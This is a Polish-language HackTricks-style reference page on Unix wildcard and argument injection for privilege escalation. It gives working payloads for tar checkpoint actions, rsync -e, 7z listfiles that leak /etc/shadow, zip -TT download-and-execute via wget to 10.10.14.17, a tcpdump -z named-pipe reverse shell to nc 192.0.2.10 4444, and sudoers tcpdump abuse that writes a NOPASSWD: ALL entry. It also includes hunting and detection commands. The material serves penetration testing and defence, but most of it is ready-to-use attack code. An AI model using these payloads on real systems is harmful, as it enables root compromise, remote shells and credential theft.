# Sztuczki z wildcardami

{{#include ../../banners/hacktricks-training.md}}

> **Argument injection** z użyciem wildcardów (czyli *globów*) ma miejsce, gdy uprzywilejowany skrypt uruchamia binarny plik Uniksa, taki jak `tar`, `chown`, `rsync`, `zip`, `7z`, …, z nieujętym w cudzysłów wildcardem, takim jak `*`.  
> Ponieważ powłoka rozwija wildcard **przed** uruchomieniem pliku binarnego, atakujący, który może tworzyć pliki w katalogu roboczym, może przygotować nazwy plików zaczynające się od `-`, przez co zostaną zinterpretowane jako **opcje zamiast danych**. W ten sposób można przemycić dowolne flagi, a nawet polecenia.<sup>[[6]](#references)</sup>
> Ta strona zawiera najprzydatniejsze prymitywy, najnowsze badania i nowoczesne metody wykrywania z lat 2023–2025.

## chown / chmod

Możesz **skopiować właściciela/grupę lub bity uprawnień z pliku referencyjnego**, nadużywając flagi `--reference`, gdy nazwa pliku wyglądająca jak opcja zostanie rozwinięta przez wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

Gdy root później wykonuje coś takiego:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

Rozwinięte `--reference=.drf.php` nadpisuje jawnie podanego właściciela i tryb, przez co pasujące pliki dziedziczą metadane z `.drf.php` (a przy powyższej konfiguracji stają się zapisywalne przez atakującego).<sup>[[6]](#references)</sup>

Przejrzyj cały uprzywilejowany helper, nie tylko jego wiersz `chown`. Zmiana właściciela może wyczyścić bity set-user-ID lub set-group-ID; [POSIX pozostawia przypadek uprzywilejowany zależny od implementacji](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html). Późniejsze `chmod` w tym samym zadaniu może przywrócić te bity plikom wybranym wcześniej, zmieniając rezultat. Zanim uznasz to za ścieżkę do uzyskania uprawnień przez wykonanie pliku, potwierdź rzeczywistą kolejność poleceń, katalog z zapisywalnymi plikami dopasowywanymi przez glob, zachowanie względem plików i linków, wynikowego właściciela i tryb oraz to, czy system plików respektuje set-user-ID. Nieczytelny helper uniemożliwia ustalenie tych szczegółów.

*PoC i narzędzie*: [`wildpwn`](https://github.com/localh0t/wildpwn) (atak łączony).<sup>[[7]](#references)</sup>
Więcej szczegółów zawiera również klasyczny artykuł DefenseCode.<sup>[[6]](#references)</sup>

---

## GNU `cp` w uprzywilejowanym skrypcie

Przeanalizuj skrypt uruchamiany jako root, który kopiuje pliki z katalogu roboczego wybranego przez wywołującego, używając zwykłego globu, na przykład `cp .version * /etc/app/staged/`, jeśli użytkownik o niższych uprawnieniach może tworzyć tam pliki o dowolnych nazwach. GNU `cp` może zinterpretować nazwę pliku zaczynającą się od myślnika, rozwiniętą z `*`, jako opcję. Opcja `--preserve=mode` może zachować bity trybu źródła w nowej kopii, a `--target-directory` może zmienić miejsce docelowe kopiowania. Aby potwierdzić wystąpienie któregokolwiek z tych efektów, należy zweryfikować konkretną gałąź skryptu, stan katalogu docelowego, efektywne uprawnienia, zasady systemu plików i zachowanie GNU `cp`; sama treść reguły sudo lub skryptu nie dowodzi eskalacji uprawnień. Poprzedzenie argumentów `./` lub zakończenie przetwarzania opcji za pomocą `--` zapobiega takiej interpretacji nazw zaczynających się od myślnika przez GNU `cp` ([GNU Coreutils FAQ](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [podręcznik `cp`](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)).

---

## tar

### GNU tar

Wykonuj dowolne polecenia, nadużywając funkcji **checkpoint** GNU tar i akcji checkpoint.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Gdy root uruchomi np. `tar -czf /root/backup.tgz *`, plik `shell.sh` zostanie wykonany z uprawnieniami roota.<sup>[[10]](#references)</sup>

### bsdtar / macOS — zastrzeżenie dotyczące nadpisywania kompresora

Domyślny `tar` w nowszych wersjach macOS (oparty na `libarchive`) *nie* udostępnia interfejsu `--checkpoint` z GNU tar, ale bsdtar dokumentuje opcję **--use-compress-program** służącą do wyboru zewnętrznego kompresora.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Gdy uprzywilejowany skrypt uruchamia `tar -cf backup.tar *`, `sh` zostaje wybrany za pośrednictwem `PATH` ofiary, a bsdtar uruchamia go jako kompresor.<sup>[[11]](#references)</sup> Dowodzi to możliwości wstrzyknięcia opcji, ale samo w sobie nie zapewnia niezawodnego mechanizmu wykonywania dowolnych poleceń: nazwa pliku utworzona przez wildcard nie może zawierać `/`, a bsdtar przekazuje dane archiwum, a nie wybrane przez atakującego polecenie powłoki. Do wykonania kodu potrzebny jest dodatkowo kontrolowany plik wykonywalny odnajdywany przez `PATH` albo inny kanał argumentów, który pozwala wskazać przydatny program.

---

## rsync

`rsync` pozwala zastąpić zdalną powłokę lub zdalny plik binarny za pomocą flag wiersza poleceń, takich jak `-e` i `--rsync-path`.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

Jeśli root później zarchiwizuje katalog poleceniem `rsync -az * backup:/srv/`, wstrzyknięta flaga może uruchomić powłokę za pośrednictwem mechanizmu zdalnej powłoki.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (tryb `rsync`).

---

## 7-Zip / 7z / 7za

Nawet gdy uprzywilejowany skrypt *defensywnie* poprzedza wildcard ciągiem `--` (aby zatrzymać parsowanie opcji), CLI 7-Zip akceptuje **pliki list plików**, których nazwy poprzedzono znakiem `@`. Połączenie tego z symlinkiem pozwala *eksfiltrować dowolne pliki*.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

Jeśli root wykona coś takiego:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip spróbuje odczytać `root.txt` (→ `/etc/shadow`) jako listę plików i przerwie działanie, **wypisując zawartość na stderr**.<sup>[[13]](#references)</sup>

Działa to również z `-- *`, ponieważ CLI 7-Zip jawnie akceptuje zarówno zwykłe nazwy plików, jak i `@listfiles` jako argumenty pozycyjne, więc nazwa taka jak `@root.txt` nadal jest traktowana specjalnie.<sup>[[13]](#references)</sup>

---

## zip

Gdy aplikacja przekazuje do `zip` kontrolowane przez użytkownika nazwy plików (przez wildcard albo wyliczając nazwy bez `--`), dostępne są dwa bardzo praktyczne prymitywy.<sup>[[2]](#references)[[3]](#references)</sup>

- RCE przez test hook: `-T` włącza „test archive”, a `-TT <cmd>` zastępuje tester dowolnym programem (długa forma: `--unzip-command <cmd>`). Jeśli możesz wstrzyknąć nazwy plików zaczynające się od `-`, rozdziel flagi między różne nazwy plików, aby zadziałało parsowanie krótkich opcji.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Uwagi
- NIE próbuj używać pojedynczej nazwy pliku, takiej jak `'-T -TT <cmd>'` — krótkie opcje są parsowane znak po znaku i to nie zadziała. Użyj osobnych tokenów, jak pokazano.<sup>[[3]](#references)</sup>
- Jeśli aplikacja usuwa ukośniki z nazw plików, pobierz plik z hosta/IP bez ścieżki (domyślna ścieżka `/index.html`) i zapisz go lokalnie za pomocą `-O`, a następnie wykonaj.<sup>[[3]](#references)</sup>
- Możesz debugować parsowanie za pomocą `-sc` (wyświetla przetworzone argv) lub `-h2` (więcej pomocy), aby sprawdzić, jak przetwarzane są tokeny.<sup>[[3]](#references)</sup>

Przykład (lokalne działanie w zip 3.0).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Eksfiltracja danych/leak: Jeśli warstwa webowa wyświetla stdout/stderr `zip` (co jest częste w naiwnych wrapperach), wstrzyknięte flagi, takie jak `--help`, lub błędy spowodowane nieprawidłowymi opcjami pojawią się w odpowiedzi HTTP, potwierdzając command-line injection i ułatwiając dostrajanie payloadu.<sup>[[3]](#references)</sup>

---

## Dodatkowe możliwości option-injection

Gdy uprzywilejowany wrapper rozwija wildcard w zapisywalnym katalogu, warto sprawdzić udokumentowane opcje.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flaga do nadużycia | Efekt |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Przekazuje ciąg polecenia do powłoki |
| `git`   | `-c core.sshCommand=<cmd>` | Używa `<cmd>` zamiast SSH do pobierania/wysyłania danych przez Git |
| `scp`   | `-S <program>` | Używa alternatywnego programu połączeniowego zgodnego z SSH |

Te prymitywy warto sprawdzać poza klasycznymi przypadkami *tar/rsync/zip*.

---

## Wyszukiwanie podatnych wrapperów i zadań

Najnowsze analizy przypadków i wskazówki dotyczące wykrywania pokazują, że wildcard/argv injection nie jest już problemem ograniczonym do **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Ta sama klasa błędów nadal występuje w:

- funkcjach webowych, które „pobierają wszystko jako zip/tar” z kontrolowanych przez atakującego katalogów przesyłanych plików
- powłokach debugujących producentów/urządzeń, które udostępniają wrapper **tcpdump** z polami nazwy pliku/filtra kontrolowanymi przez atakującego
- zadaniach tworzenia kopii zapasowych lub rotacji, które wywołują `tar`, `rsync`, `7z`, `zip`, `chown` lub `chmod` w zapisywalnych katalogach

Przydatne polecenia do wstępnej analizy (wywołanie `pspy` używa udokumentowanych flag procesu/zdarzeń plikowych oraz interwału).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Szybkie heurystyki:

- `-- *` to dobre rozwiązanie dla wielu narzędzi GNU, ale **nie** dla `7z`/`7za`, ponieważ `@listfiles` są parsowane osobno.<sup>[[13]](#references)</sup>
- W przypadku `zip` szukaj wrapperów, które bezpośrednio wyliczają kontrolowane przez użytkownika nazwy plików; dzielenie krótkich opcji (`-T` + `-TT <cmd>`) nadal działa nawet bez globu powłoki.<sup>[[2]](#references)[[3]](#references)</sup>
- W przypadku `tcpdump` zwróć szczególną uwagę na wrappery, które pozwalają kontrolować **nazwy plików wyjściowych**, **ustawienia rotacji** lub argumenty **odtwarzania plików przechwytywania**.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE przez wstrzykiwanie argv we wrapperach

Gdy restricted shell lub wrapper dostawcy buduje wiersz poleceń `tcpdump` przez konkatenację pól kontrolowanych przez użytkownika (np. parametru „file name”) bez ścisłego cytowania/walidacji, można przemycić dodatkowe flagi `tcpdump`. Połączenie `-G` (rotacja oparta na czasie), `-W` (ograniczenie liczby plików) i `-z <cmd>` (polecenie wykonywane po rotacji) umożliwia wykonanie dowolnego polecenia z uprawnieniami użytkownika uruchamiającego tcpdump (często root na urządzeniach).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Wymagania wstępne:

- Możesz wpływać na `argv` przekazywane do `tcpdump` (np. za pośrednictwem wrappera takiego jak `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper nie oczyszcza spacji ani tokenów z prefiksem `-` w polu nazwy pliku.<sup>[[4]](#references)</sup>

Klasyczny PoC (uruchamia skrypt reverse shell z zapisywalnej ścieżki).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Szczegóły:

- `-G 1` obraca pliki co sekundę, a `-W 1` zatrzymuje działanie po obróceniu jednego pliku; przed obróceniem przechwytywanie musi odebrać pasujący pakiet.<sup>[[18]](#references)</sup>
- `-z <cmd>` uruchamia polecenie post-rotate raz na każde obrócenie pliku i przekazuje zamkniętą ścieżkę do pliku zapisu jako argument; upewnij się, że obsługa argumentów przez skrypt/interpreter jest zgodna z twoim payloadem.<sup>[[18]](#references)</sup>

Warianty bez nośników wymiennych:

- Jeśli masz inną metodę zapisu plików (np. osobny wrapper polecenia umożliwiający przekierowanie wyjścia), zapisz skrypt w znanej ścieżce i uruchom `-z /path/script.sh`; w razie potrzeby skrypt powinien sam wywołać `/bin/sh`.<sup>[[18]](#references)</sup>
- Jeśli wrapper dostawcy pozwala wybrać ścieżkę obróconego pliku, sprawdź kontrolę nad tą ścieżką wyłącznie w połączeniu z poleceniem post-rotate, które interpretuje argument wskazujący plik zapisu; sama kontrola ścieżki nie powoduje wykonania zawartości pliku.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump z wildcardami/dodatkowymi argumentami → dowolny zapis/odczyt i root

Przykład antywzorca sudoers:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

Reguła pozostawia kilka możliwości dostępnych w udokumentowanym parserze tcpdump:<sup>[[3]](#references)[[18]](#references)</sup>
- Glob `*` i liberalne wzorce ograniczają tylko pierwszy argument `-w`. `tcpdump` akceptuje wiele opcji `-w`; obowiązuje ostatnia.<sup>[[3]](#references)[[18]](#references)</sup>
- Reguła nie ogranicza innych opcji, więc dozwolone są m.in. `-Z`, `-r`, `-V`.<sup>[[3]](#references)[[18]](#references)</sup>

Poniżej opisano istotne prymitywy.<sup>[[3]](#references)[[18]](#references)</sup>
- Nadpisanie ścieżki docelowej za pomocą drugiej opcji `-w` (pierwsza spełnia tylko wymóg sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Path traversal wewnątrz pierwszego `-w`, aby opuścić ograniczone drzewo katalogów.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Wymuś właściciela plików za pomocą `-Z root` (tworzy pliki należące do root w dowolnym miejscu).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Zapis dowolnej zawartości przez odtworzenie spreparowanego PCAP za pomocą `-r` (np. aby dodać wpis do sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Utwórz PCAP zawierający dokładny payload ASCII i zapisz go jako root</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- Odczyt dowolnego pliku/wyciek sekretów za pomocą `-V <file>` (interpretuje listę plików zapisu). Diagnostyka błędów często wyświetla wiersze, ujawniając ich zawartość.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: wstrzyknięcie argumentu zip do RCE + eskalacja uprawnień przez błędną konfigurację sudo tcpdump](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Pełny łańcuch exploitów](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Wykryto potencjalny Shell przez wstrzyknięcie wildcardów](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Powrót do przyszłości: wildcardy Unix poszły w ruch (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils — wywołanie `chown`](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils — wywołanie `chmod`](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [Punkty kontrolne GNU tar](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Podręcznik bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Podręcznik rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Składnia wiersza poleceń 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Podręcznik flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Dokumentacja konfiguracji Git](https://git-scm.com/docs/git-config)
- [17] [Podręcznik `scp` dla OpenBSD](https://man.openbsd.org/scp)
- [18] [Podręcznik tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
